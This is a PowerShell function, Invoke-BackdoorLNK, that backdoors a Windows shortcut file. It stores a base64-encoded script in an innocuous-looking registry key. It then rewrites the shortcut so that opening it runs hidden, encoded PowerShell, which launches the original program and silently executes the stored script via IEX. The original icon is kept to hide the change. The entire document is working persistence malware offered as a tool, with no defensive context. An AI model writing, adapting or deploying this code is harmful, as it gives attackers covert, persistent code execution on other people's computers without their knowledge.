function Invoke-BackdoorLNK {


    [CmdletBinding()] Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $LNKPath,

        [String]
        $EncScript,

        [String]
        $RegPath = 'HKCU:\Software\Microsoft\Windows\debug',

        [Switch]
        $Cleanup
    )

    $RegParts = $RegPath.split("\")
    $Path = $RegParts[0..($RegParts.Count-2)] -join "\"
    $Name = $RegParts[-1]


    $Obj = New-Object -ComObject WScript.Shell
    $LNK = $Obj.CreateShortcut($LNKPath)

    
    $TargetPath = $LNK.TargetPath
    $WorkingDirectory = $LNK.WorkingDirectory
    $IconLocation = $LNK.IconLocation

    if($CleanUp) {

        
        $OriginalPath = ($IconLocation -split ",")[0]

        $LNK.TargetPath = $OriginalPath
        $LNK.Arguments = $Null
        $LNK.WindowStyle = 1
        $LNK.Save()

        
        $null = Remove-ItemProperty -Force -Path $Path -Name $Name
    }
    else {

        if(!$EncScript -or $EncScript -eq '') {
            throw "-EncScript or -Cleanup required!"
        }

        
        $null = Set-ItemProperty -Force -Path $Path -Name $Name -Value $EncScript

        "[*] B64 script stored at '$RegPath'`n"

        
        $LNK.TargetPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

        
        $LaunchString = '[System.Diagnostics.Process]::Start("'+$TargetPath+'");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp '+$Path+' '+$Name+').'+$Name+')))'

        $LaunchBytes  = [System.Text.Encoding]::UNICODE.GetBytes($LaunchString)
        $LaunchB64 = [System.Convert]::ToBase64String($LaunchBytes)

        $LNK.Arguments = "-w hidden -nop -enc $LaunchB64"

        
        $LNK.WorkingDirectory = $WorkingDirectory
        $LNK.IconLocation = "$TargetPath,0"
        $LNK.WindowStyle = 7
        $LNK.Save()

        "[*] .LNK at $LNKPath set to trigger`n"
    }
}
